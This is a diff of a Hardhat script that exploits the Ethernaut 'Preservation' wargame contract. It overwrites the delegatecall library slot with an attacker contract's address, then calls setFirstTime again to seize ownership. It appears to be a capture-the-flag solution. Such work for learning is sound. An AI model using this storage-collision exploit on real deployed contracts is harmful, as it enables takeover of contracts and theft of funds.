@@ -2,7 +2,7 @@ import { ethers } from "hardhat";
 
 async function attackPreservation() {
     // change contract addresses here.
-    const preservationAddress = "0x62Ca466832854E54e87fAd410eDA0640756FfCa7";
+    const preservationAddress = "0x6a93e425f74d3efAD0f030C1cc00226c2B5f8f6b";
     // const player = ""; //place your player address here (you may type player in ethernaut console)
     const args: any[] = [];
     const player = process.env.PRIVATE_KEY || "";
@@ -26,7 +26,7 @@ async function attackPreservation() {
     const attack = await (
         await ethers.getContractFactory("AttackLibraryContract", player)
     ).deploy();
-    console.log(attack);
+    // console.log(attack);
     console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (attackLibraryContract.address){
@@ -53,21 +53,22 @@ async function attackPreservation() {
     console.log("Current timeZone1Library is: ", oldLibrary);
     console.log("Changing library to Players own contract and attack...");
     //old implementation
-    // const uint256 = "0x" + "0".repeat(24) + attack.address.slice(2);
-    // console.log(`setting to ${uint256}`);
-    // const tx1 = await contract.setFirstTime(uint256);
-    // const tx1receipt = await tx1.wait(1);
+    const uint256 = "0x" + "0".repeat(24) + attack.address.slice(2);
+    console.log(`setting to ${uint256}`);
+    const tx1 = await contract.setFirstTime(uint256);
+    const tx1receipt = await tx1.wait(1);
     // console.log(tx1receipt);
-    // const newLibrary = await contract.timeZone1Library();
-    // console.log("New timeZone1Library is: ", newLibrary);
-    // console.log("Change library done!now setting new owner via vulnerability...");
-    // const tx2 = await contract.setFirstTime(1);
-    // const tx2Receipt = await tx2.wait(1);
-    // console.log(tx2Receipt);
+    console.log("change library done");
+    console.log("Change library done!now setting new owner via vulnerability...");
+    const tx2 = await contract.setFirstTime(1);
+    const tx2Receipt = await tx2.wait(1);
+    console.log(tx2Receipt);
+    console.log("change owner done");
     // new implementation
-    const tx1 = await attack.hack(preservationAddress);
-    const tx1Receipt = await tx1.wait();
-    console.log(tx1Receipt);
+    // const tx1 = await attack.hack(preservationAddress, players.address);
+    // const tx1Receipt = await tx1.wait();
+    // console.log(tx1Receipt);
+    console.log("tx done");
     const newLibrary = await contract.timeZone1Library();
     console.log("New timeZone1Library is: ", newLibrary);
     const newOwner = await contract.owner();
